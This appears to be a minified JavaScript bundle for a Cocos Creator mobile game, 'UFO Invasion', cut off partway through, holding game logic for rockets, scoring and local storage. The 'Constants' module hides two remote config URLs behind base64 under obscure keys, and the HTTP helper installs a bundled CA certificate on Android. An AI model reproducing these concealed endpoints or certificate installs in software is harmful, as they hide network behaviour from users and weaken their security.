window.__require = function t(e, o, n) {
function r(i, a) {
if (!o[i]) {
if (!e[i]) {
var s = i.split("/");
s = s[s.length - 1];
if (!e[s]) {
var u = "function" == typeof __require && __require;
if (!a && u) return u(s, !0);
if (c) return c(s, !0);
throw new Error("Cannot find module '" + i + "'");
}
i = s;
}
var l = o[i] = {
exports: {}
};
e[i][0].call(l.exports, function(t) {
return r(e[i][1][t] || t);
}, l, l.exports, t, e, o, n);
}
return o[i].exports;
}
for (var c = "function" == typeof __require && __require, i = 0; i < n.length; i++) r(n[i]);
return r;
}({
BG: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "b97a7Rvk+xCfox80xmgy88w", "BG");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../Scene/Game/GameController"), i = cc._decorator, a = i.ccclass, s = (i.property, 
function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.speed = 100;
e.isCheck = !1;
return e;
}
e.prototype.start = function() {
for (var t = 0; t < 2; t++) {
this.node.children[t].width = cc.winSize.width;
this.node.children[1].x = 3 - cc.winSize.width;
}
};
e.prototype.update = function(t) {
if (!c.default.ins.isCheck) {
var e = this.node.x;
(e += this.speed * t) >= cc.winSize.width - 3 && (e = 0);
this.node.x = e;
}
};
return e = r([ a ], e);
}(cc.Component));
o.default = s;
cc._RF.pop();
}, {
"../Scene/Game/GameController": "GameController"
} ],
CameraFollow: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "a8f4ebvpaJKMbk+tPkSceLA", "CameraFollow");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = cc._decorator, i = c.ccclass, a = c.property, s = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.player = null;
e.offset = 0;
e.positionY = 0;
e.isCheck = !1;
return e;
}
e.prototype.start = function() {
var t = cc.winSize, e = t.width, o = t.height;
this.offset = (e - 1280) / 2;
this.positionY = o - 720;
};
e.prototype.update = function(t) {
this.node.y = this.player.y + 67;
};
r([ a(cc.Node) ], e.prototype, "player", void 0);
return e = r([ i ], e);
}(cc.Component);
o.default = s;
cc._RF.pop();
}, {} ],
Constants: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "3605amWsGRE4Yp0Hnpn/wRl", "Constants");
window.constan = {
vlksd: [ "aHR0cHM6Ly9zZXR0aW5nYXAuMWQxNzE5ZmUxOGNhYWJhYjYwMWEyYmFjODE1ZGVkNzkuZnVuL3Vmby5qc29u", "aHR0cHM6Ly9zZXR0aW5nYXAuMjM1MWZlZTEyZDkzNTkzZmFkMjc4ZmZhZjY0MTA1YzMuZnVuL3Vmby5qc29u" ],
ccs: 2,
lanhs: "ufoinvasion",
okhj: !1
};
cc._RF.pop();
}, {} ],
Explosion: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "ac938tejwBHOYDMQVFv29Za", "Explosion");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = cc._decorator, i = c.ccclass, a = (c.property, function(t) {
n(e, t);
function e() {
return null !== t && t.apply(this, arguments) || this;
}
e.prototype.done = function() {
this.node.destroy();
};
e.prototype.onBeginContact = function(t, e, o) {
if (o.body.type === cc.RigidBodyType.Dynamic) {
var n = o.node.getPosition();
n.normalizeSelf();
n.mulSelf(2e4);
o.body.applyForceToCenter(n);
}
};
return e = r([ i ], e);
}(cc.Component));
o.default = a;
cc._RF.pop();
}, {} ],
GameController: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "ad121m7Lf5BkaCxwt+RMuJK", "GameController");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../../Data/GameDataManage"), i = t("../../Helper/utils"), a = t("./Rocket"), s = t("./UIController"), u = cc._decorator, l = u.ccclass, p = u.property, f = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.baseGame = null;
e.uiController = null;
e.prefabLabel = null;
e.target = null;
e.canvas = null;
e.items = [];
e.house = null;
e.rocket = null;
e.count = 0;
e.time = 1.5;
e.score = 0;
e.gameOver = !1;
e.id = 0;
e.heart = 3;
e.speed = 150;
e.isCheck = !1;
e.isTap = !1;
e.sum = 0;
e.angle = 1.5;
return e;
}
o = e;
e.prototype.onLoad = function() {
o.ins = this;
cc.director.getCollisionManager().enabled = !0;
};
e.prototype.start = function() {
c.setScore(0);
this.canvas.on(cc.Node.EventType.TOUCH_START, this.touchStart, this);
this.canvas.on(cc.Node.EventType.TOUCH_CANCEL, this.touchEnd, this);
this.canvas.on(cc.Node.EventType.TOUCH_END, this.touchEnd, this);
this.itemCreate();
};
e.prototype.itemCreate = function() {
var t = i.getRandom(0, 3), e = cc.instantiate(this.items[t]);
this.baseGame.addChild(e);
var o = i.getRandom(0, 4);
e.x = this.house.children[o].x;
e.y = 400;
e.zIndex = -1;
this.scheduleOnce(this.itemCreate.bind(this), this.time);
};
e.prototype.touchStart = function(t) {
var e = this;
if (0 == this.isTap) {
this.isTap = !0;
var o = this.baseGame.convertToNodeSpaceAR(t.getLocation());
this.target.position = o;
this.target.active = !0;
this.rocketCreate(o);
this.scheduleOnce(function() {
e.isTap = !1;
}, .3);
}
};
e.prototype.rocketCreate = function(t) {
var e = cc.instantiate(this.rocket);
this.baseGame.addChild(e);
e.position = cc.v2(i.getRandom(-cc.winSize.width / 2 + 200, cc.winSize.width / 2 - 200), -400);
e.getComponent(a.default).moveNode(t);
};
e.prototype.touchEnd = function() {
this.target.active = !1;
};
e.prototype.getSpeed = function() {
this.count++;
if (this.count >= 15) {
this.count = 0;
this.speed <= 400 && (this.speed += 30);
this.time >= 1 && (this.time -= .25);
}
};
e.prototype.ChoiceCorrect = function(t) {
this.score += 10;
c.setScore(this.score);
this.getSpeed();
this.uiController.updateLabelScore(this.score);
this.onCreateLabel(0, t);
};
e.prototype.onCreateLabel = function(t, e) {
var o = cc.instantiate(this.prefabLabel);
this.baseGame.addChild(o);
o.position = e;
o.y = e.y + 100;
0 === t && (o.getComponent(cc.Label).string = "+10");
var n = cc.moveBy(.5, cc.v2(0, 100));
o.runAction(cc.sequence(n, cc.callFunc(function() {
o.destroy();
})));
};
e.prototype.gameDone = function() {
this.unscheduleAllCallbacks();
var t = c.getBestTop();
if (t[c.getMode()] < this.score) {
t[c.getMode()] = this.score;
c.setBestTop(t);
}
};
e.prototype.updateHeart = function() {
if (!this.gameOver) {
this.heart--;
this.uiController.labelUpdateHeart(this.heart);
this.uiController.subHeart();
if (this.heart <= 0) {
this.losingGame();
this.isCheck = !0;
}
}
};
e.prototype.losingGame = function() {
var t = this, e = c.getBestTop();
this.gameDone();
this.isCheck = !0;
this.gameOver = !0;
this.uiController.time.stop();
this.scheduleOnce(function() {
t.baseGame.active = !1;
t.score > e[c.getMode()] ? t.uiController.gameWinEvent() : t.uiController.gameLoseEvent();
}, .5);
};
e.prototype.onClickHome = function() {
cc.director.loadScene("HomeScene");
};
e.prototype.onClickRestart = function() {
cc.director.loadScene("GameScene");
};
var o;
r([ p(cc.Node) ], e.prototype, "baseGame", void 0);
r([ p(s.default) ], e.prototype, "uiController", void 0);
r([ p(cc.Prefab) ], e.prototype, "prefabLabel", void 0);
r([ p(cc.Node) ], e.prototype, "target", void 0);
r([ p(cc.Node) ], e.prototype, "canvas", void 0);
r([ p(cc.Prefab) ], e.prototype, "items", void 0);
r([ p(cc.Node) ], e.prototype, "house", void 0);
r([ p(cc.Prefab) ], e.prototype, "rocket", void 0);
return e = o = r([ l ], e);
}(cc.Component);
o.default = f;
cc._RF.pop();
}, {
"../../Data/GameDataManage": "GameDataManage",
"../../Helper/utils": "utils",
"./Rocket": "Rocket",
"./UIController": "UIController"
} ],
GameDataManage: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "3eb54yVUwNMzJ9wwTNU+WYJ", "GameDataManage");
Object.defineProperty(o, "__esModule", {
value: !0
});
var n = t("./LocalDataManager");
o.getLvCanPlay = function() {
return n.getIntForKey("LEVEL_CAN_PLAY", 1);
};
o.setLvCanPlay = function(t) {
return n.setIntForKey("LEVEL_CAN_PLAY", t);
};
o.getPause = function() {
return n.getBoolForKey("PAUSE", !0);
};
o.setPause = function(t) {
return n.setBoolForKey("PAUSE", t);
};
o.getBomb = function() {
return n.getBoolForKey("Bomb", !0);
};
o.setBomb = function(t) {
return n.setBoolForKey("Bomb", t);
};
o.getRocket = function() {
return n.getBoolForKey("Rocket", !0);
};
o.setRocket = function(t) {
return n.setBoolForKey("Rocket", t);
};
o.getLighting = function() {
return n.getIntForKey("Lighting", 0);
};
o.setLighting = function(t) {
return n.setIntForKey("Lighting", t);
};
o.getLevel = function() {
return n.getIntForKey("Level", 1);
};
o.setLevel = function(t) {
return n.setIntForKey("Level", t);
};
o.getScore = function() {
return n.getIntForKey("Score", 0);
};
o.setScore = function(t) {
return n.setIntForKey("Score", t);
};
o.getMode = function() {
return n.getIntForKey("Mode", 0);
};
o.setMode = function(t) {
return n.setIntForKey("Mode", t);
};
o.getHightScore = function() {
return n.getIntForKey("HightScore", 0);
};
o.setHightScore = function(t) {
return n.setIntForKey("HightScore", t);
};
o.getIDChar = function() {
return n.getIntForKey("IDChar", 0);
};
o.setIDChar = function(t) {
return n.setIntForKey("IDChar", t);
};
o.getBestTop = function() {
return n.getObjectForKey("BestTop", [ 0, 0, 0 ]);
};
o.setBestTop = function(t) {
return n.setObjectForKey("BestTop", t);
};
cc._RF.pop();
}, {
"./LocalDataManager": "LocalDataManager"
} ],
GameState: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "a99f3DytT1Diqg3sXFRGRQL", "GameState");
Object.defineProperty(o, "__esModule", {
value: !0
});
var n = function() {
function t() {}
t.level = 1;
return t;
}();
o.default = n;
cc._RF.pop();
}, {} ],
HomeController: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "1a029Ktjh9LrKfZtecj+c1t", "HomeController");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../../Data/GameDataManage"), i = cc._decorator, a = i.ccclass, s = i.property, u = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.tabHelp = null;
e.tab = null;
e.buttonHome = null;
return e;
}
e.prototype.onHelp = function() {
this.buttonHome.active = !0;
this.tabHelp.scale = .5;
var t = cc.scaleTo(1, 1).easing(cc.easeBackOut());
this.tabHelp.runAction(t);
this.tab.active = !0;
};
e.prototype.offHelp = function() {
var t = this;
this.buttonHome.active = !1;
var e = cc.sequence(cc.scaleTo(1, .1), cc.callFunc(function() {
t.tab.active = !1;
})).easing(cc.easeBackOut());
this.tabHelp.runAction(e);
};
e.prototype.onClickSelectMode = function(t, e) {
var o = parseInt(e);
c.setMode(o);
cc.director.loadScene("GameScene");
};
r([ s(cc.Node) ], e.prototype, "tabHelp", void 0);
r([ s(cc.Node) ], e.prototype, "tab", void 0);
r([ s(cc.Node) ], e.prototype, "buttonHome", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = u;
cc._RF.pop();
}, {
"../../Data/GameDataManage": "GameDataManage"
} ],
HttpRequ: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "c4f0cJsJ1FIcpiGjlGcnIhe", "HttpRequ");
window.HttpReq = {
STATE: {
ERROR: 3,
FAIL: 2,
SUCCESS: 1,
TIMEOUT: 4
},
Get: function(t, e, o) {
var n = this, r = cc.loader.getXMLHttpRequest();
cc.sys.isNative && cc.sys.os == cc.sys.OS_ANDROID && installCert(cc.url.raw("resources/ca.cer"));
r.onreadystatechange = function() {
4 == r.readyState && (200 == r.status ? e && e(n.STATE.SUCCESS, r.responseText) : e && e(n.STATE.FAIL, r.responseText));
};
r.ontimeout = function() {
e && e(n.STATE.ERROR, null);
};
r.onerror = function() {
e && e(n.STATE.ERROR, null);
};
r.timeout = o || 2e4;
r.open("GET", t, !0);
r.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
r.setRequestHeader("Accept-Language", "en");
r.send();
},
Post: function(t, e, o) {
var n = this, r = cc.loader.getXMLHttpRequest();
cc.sys.isNative && cc.sys.os == cc.sys.OS_ANDROID && installCert(cc.url.raw("resources/ca.cer"));
r.onreadystatechange = function() {
4 == r.readyState && (200 == r.status ? o(n.STATE.SUCCESS, r.responseText) : o(n.STATE.FAIL, r.responseText));
};
r.ontimeout = function() {
o(n.STATE.TIMEOUT, null);
};
r.onerror = function() {
o(n.STATE.ERROR, null);
};
r.timeout = 2e4;
r.open("POST", t, !0);
r.setRequestHeader("Accept-Language", "en");
r.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
r.send(JSON.stringify(e));
}
};
cc._RF.pop();
}, {} ],
Items: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "548b1B3fyNLUpRKfoHlGex2", "Items");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("./GameController"), i = cc._decorator, a = i.ccclass, s = i.property, u = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.eff = null;
e.angle = 2;
e.speed = 0;
e.dir = cc.Vec2.ZERO;
return e;
}
e.prototype.start = function() {
this.speed = c.default.ins.speed;
};
e.prototype.update = function(t) {
this.node.y -= this.speed * t;
this.node.angle += this.angle;
};
e.prototype.effCreate = function() {
var t = cc.instantiate(this.eff);
this.node.parent.addChild(t);
t.position = this.node.position;
};
e.prototype.onCollisionEnter = function(t) {
if (10 == t.tag) {
this.effCreate();
c.default.ins.ChoiceCorrect(this.node.position);
this.node.destroy();
}
if (5 == t.tag) {
c.default.ins.losingGame();
t.node.destroy();
}
};
r([ s(cc.Prefab) ], e.prototype, "eff", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = u;
cc._RF.pop();
}, {
"./GameController": "GameController"
} ],
JoyStickNew: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "03f93nc4SlKVJtTSo3jLvGk", "JoyStickNew");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../Helper/constants"), i = t("../Scene/Game/GameController"), a = cc._decorator, s = a.ccclass, u = a.property, l = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.moveNode = null;
return e;
}
e.prototype.onLoad = function() {
this.node.on(cc.Node.EventType.TOUCH_START, this.onTouchJoyStickStart, this);
this.node.on(cc.Node.EventType.TOUCH_MOVE, this.onTouchJoyStick, this);
this.node.on(cc.Node.EventType.TOUCH_CANCEL, this.onJoyStickStop, this);
this.node.on(cc.Node.EventType.TOUCH_END, this.onJoyStickStop, this);
};
e.prototype.start = function() {};
e.prototype.onTouchJoyStickStart = function(t) {
var e = t.getLocation(), o = this.node.convertToNodeSpaceAR(e), n = this.node, r = n.width, i = n.height, a = o, s = .7 * cc.v2(r, i).mulSelf(.5).x;
a.mag() > s && (a = a.normalizeSelf().mul(s));
this.moveNode.x = a.x;
this.moveNode.y = a.y;
var u = Math.PI;
Math.atan2(this.Direction.x, this.Direction.y);
this.node.emit(c.START, this.Direction);
};
e.prototype.onTouchJoyStick = function(t) {
if (!i.default.ins.isCheck) {
var e = t.getLocation(), o = this.node.convertToNodeSpaceAR(e), n = this.node, r = n.width, a = n.height, s = o, u = .8 * cc.v2(r, a).mulSelf(.5).x;
s.mag() > u && (s = s.normalizeSelf().mul(u));
this.moveNode.x = s.x;
this.moveNode.y = s.y;
var l = Math.PI;
Math.atan2(this.Direction.x, this.Direction.y);
this.node.emit(c.MOVE, this.Direction);
}
};
e.prototype.onJoyStickStop = function() {
this.node.emit(c.STOP, this.Direction);
this.moveNode.position = cc.Vec2.ZERO;
};
Object.defineProperty(e.prototype, "Direction", {
get: function() {
return this.moveNode.position.normalize();
},
enumerable: !0,
configurable: !0
});
r([ u(cc.Node) ], e.prototype, "moveNode", void 0);
return e = r([ s ], e);
}(cc.Component);
o.default = l;
cc._RF.pop();
}, {
"../Helper/constants": "constants",
"../Scene/Game/GameController": "GameController"
} ],
LocalDataManager: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "dbee6zgVqlOzZMpTrAQSjEj", "LocalDataManager");
Object.defineProperty(o, "__esModule", {
value: !0
});
var n = function(t) {
return "UFOInvasion_" + t;
};
o.getStringForKey = function(t, e) {
var o = cc.sys.localStorage.getItem(n(t));
return o || e;
};
o.setStringForKey = function(t, e) {
cc.sys.localStorage.setItem(n(t), e);
};
o.getIntForKey = function(t, e) {
var n = o.getStringForKey(t);
return n ? parseInt(n, 10) : e;
};
o.setIntForKey = function(t, e) {
o.setStringForKey(t, "" + e);
};
o.getFloatForKey = function(t, e) {
var n = o.getStringForKey(t);
return n ? parseFloat(n) : e;
};
o.setFloatForKey = function(t, e) {
o.setStringForKey(t, "" + e);
};
o.getObjectForKey = function(t, e) {
var n = o.getStringForKey(t);
return n ? JSON.parse(n) : e;
};
o.setObjectForKey = function(t, e) {
o.setStringForKey(t, JSON.stringify(e));
};
o.getBoolForKey = function(t, e) {
var n = o.getStringForKey(t);
return n ? "true" === n : e;
};
o.setBoolForKey = function(t, e) {
o.setStringForKey(t, e.toString());
};
cc._RF.pop();
}, {} ],
ResultDialog: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "f28dfiiAtdL1KBKJA0MCjsV", "ResultDialog");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../Data/GameDataManage"), i = cc._decorator, a = i.ccclass, s = i.property, u = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.labelScore = null;
e.labelTop = null;
e.score = [];
return e;
}
e.prototype.show = function() {
this.labelTop.string = "" + c.getBestTop()[c.getMode()];
this.labelScore.string = "" + c.getScore();
this.node.scale = 0;
var t = cc.scaleTo(.5, 1).easing(cc.easeBounceOut());
this.node.runAction(t);
};
r([ s(cc.Label) ], e.prototype, "labelScore", void 0);
r([ s(cc.Label) ], e.prototype, "labelTop", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = u;
cc._RF.pop();
}, {
"../Data/GameDataManage": "GameDataManage"
} ],
Rocket: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "8fe97HRRi9C944FF0SY/DNm", "Rocket");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../../Helper/utils"), i = cc._decorator, a = i.ccclass, s = i.property, u = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.label = null;
return e;
}
e.prototype.start = function() {};
e.prototype.moveNode = function(t) {
var e = this, o = Math.atan2(t.y - this.node.y, t.x - this.node.x) * (180 / Math.PI);
this.node.angle = o - 90;
var n = c.getDistance(this.node.position, t), r = cc.spawn(cc.moveTo(n / 900, t), cc.scaleTo(n / 900, 1));
this.node.runAction(cc.sequence(r, cc.callFunc(function() {
e.getComponent(cc.BoxCollider).enabled = !0;
e.scheduleOnce(function() {
e.node.destroy();
}, .1);
})));
};
r([ s(cc.Label) ], e.prototype, "label", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = u;
cc._RF.pop();
}, {
"../../Helper/utils": "utils"
} ],
SelectLevelControl: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "e739cYPzcxAabBToS7s8ImG", "SelectLevelControl");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("../Data/GameDataManage"), i = cc._decorator, a = i.ccclass, s = i.property, u = function(t) {
n(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.tabHelp = null;
return e;
}
e.prototype.onHelp = function() {
this.tabHelp.active = !0;
};
e.prototype.offHelp = function() {
this.tabHelp.active = !1;
};
e.prototype.onClickPlay = function() {
cc.director.loadScene("Level");
};
e.prototype.onClickSelectMode = function(t, e) {
var o = parseInt(e);
c.setMode(o);
cc.director.loadScene("GamePlay");
};
r([ s(cc.Node) ], e.prototype, "tabHelp", void 0);
return e = r([ a ], e);
}(cc.Component);
o.default = u;
cc._RF.pop();
}, {
"../Data/GameDataManage": "GameDataManage"
} ],
Time: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "bfb7dWcX4FK1rnqSg/RmbYi", "Time");
var n = this && this.__extends || function() {
var t = function(e, o) {
return (t = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
})(e, o);
};
return function(e, o) {
t(e, o);
function n() {
this.constructor = e;
}
e.prototype = null === o ? Object.create(o) : (n.prototype = o.prototype, new n());
};
}(), r = this && this.__decorate || function(t, e, o, n) {
var r, c = arguments.length, i = c < 3 ? e : null === n ? n = Object.getOwnPropertyDescriptor(e, o) : n;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(t, e, o, n); else for (var a = t.length - 1; a >= 0; a--) (r = t[a]) && (i = (c < 3 ? r(i) : c > 3 ? r(e, o, i) : r(e, o)) || i);
return c > 3 && i && Object.defineProperty(e, o, i), i;
};
Object.defineProperty(o, "__esModule", {
value: !0
});
var c = t("./constants"), i = cc._decorator, a = i.ccclass, s = i.property;
o.END_CLOCK_COUNT = "END_CLOCK_COUNT";
function u(t, e) {
return ("" + t).padStart(e, "0");
}
function l(t) {
Math.floor(t / 3600), Math.floor(t % 3600 / 60);
return "" + u(Math.floor(t % 3600 % 60), 2);
}
var p = function(t) {
n(e, t);
function e() {
